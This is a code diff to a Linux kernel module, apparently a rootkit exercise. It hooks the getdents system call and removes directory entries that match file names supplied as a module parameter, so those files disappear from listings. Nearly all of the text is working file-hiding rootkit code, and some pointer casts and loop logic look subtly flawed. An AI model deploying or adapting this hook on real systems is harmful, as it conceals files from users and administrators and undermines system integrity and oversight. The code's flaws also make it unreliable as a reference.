@@ -1,4 +1,5 @@
 #include <linux/module.h>
+#include <linux/moduleparam.h>
 #include <linux/kernel.h>
 #include <linux/slab.h>
 #include <linux/fs.h>
@@ -56,26 +57,36 @@ struct linux_dirent {
     */
 };
 
-#define FILE_NAME "test.txt"
+int count;
+static char* fileNames[5];
+module_param_array(fileNames, charp, &count, 0); // This creates a command line parameter called fileNames.
+												 // fileNames="a.txt", "b.txt", "c.txt" ... up to 5 files
 		   
 asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
-	int rtn;
+	int rtn = original_getdents(fd, dirp, count); // rtn = the number of bytes of linux_dirent structs read from fd;
 	struct linux_dirent *cur = dirp;
-	rtn = original_getdents(fd, dirp, count); // rtn = the number of bytes of linux_dirent structs read from fd
 	int i = 0;
+	int j;
+	int foundFile;
 	while(i < rtn){
-		if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0){
-			int reclen = cur->d_reclen;
-			char* next_rec = (char*)cur + reclen;
-			int len = (int)dirp + rtn - (int)next_rec;
-			memmove(cur, next_rec, len);
-			rtn -= reclen;
-			continue;
+		foundFile = 0;
+		for(j = 0; fileNames[j] && j < count; j++){
+			if (strncmp(cur->d_name, fileNames[j], strlen(fileNames[j])) == 0){
+				int reclen = cur->d_reclen;
+				char* next_rec = (char*)cur + reclen;
+				int len = (int)dirp + rtn - (int)next_rec;
+				memmove(cur, next_rec, len);
+				rtn -= reclen;
+				foundFile = 1;
+				continue;
+			}
 		}
-		i += cur->d_reclen;
-		cur = (struct linux_dirent*) ((char*)dirp + i);
+		if(foundFile == 0){ // This flag prevents the program from skipping ahead when memory already got shifted
+			i += cur->d_reclen;
+			cur = (struct linux_dirent*) ((char*)dirp + i);
+		}
 	}
 	return rtn;
 }
